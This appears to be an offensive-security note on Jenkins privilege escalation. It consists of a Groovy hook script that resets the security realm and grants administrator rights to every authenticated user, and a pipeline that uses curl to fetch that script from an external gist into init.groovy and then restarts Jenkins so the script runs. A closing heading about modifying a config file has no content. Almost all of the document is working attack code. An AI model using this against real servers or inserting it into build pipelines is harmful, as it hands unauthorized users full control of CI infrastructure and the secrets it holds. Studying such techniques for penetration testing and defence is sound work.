# Privilege Escalations





## Give admin access to all authenticated users by executing a groovy script

HOOK.groovy
```
//code copied from http://tdongsi.github.io/blog/2017/12/30/groovy-hook-script-and-jenkins-configuration-as-code/
import jenkins.model.*
def instance = Jenkins.getInstance()

import hudson.security.*
def realm = new HudsonPrivateSecurityRealm(false)
instance.setSecurityRealm(realm)

def strategy = new hudson.security.GlobalMatrixAuthorizationStrategy()
strategy.add(Jenkins.ADMINISTER, 'authenticated')
instance.setAuthorizationStrategy(strategy)

instance.save()
```

```
pipeline {
    agent any
    
    stages {
        stage('Copy Groovy Script to JENKINS_HOME') {
            steps {
                sh '''
                    curl -o init.groovy https://gist.githubusercontent.com/dibsy/c42f536d12a406cbd3845aea4f6ac746/raw/b1240be7e950a96929810e5fafbdd76db46a9731/HOOK.groovy
                  '''
            }
        }
        stage('Restart Jenkins') {
            steps {
                script {
                    Jenkins.instance.restart()
                }
            }
        }        
    }
}
```



## Give extra permissions to user by modifying the config file
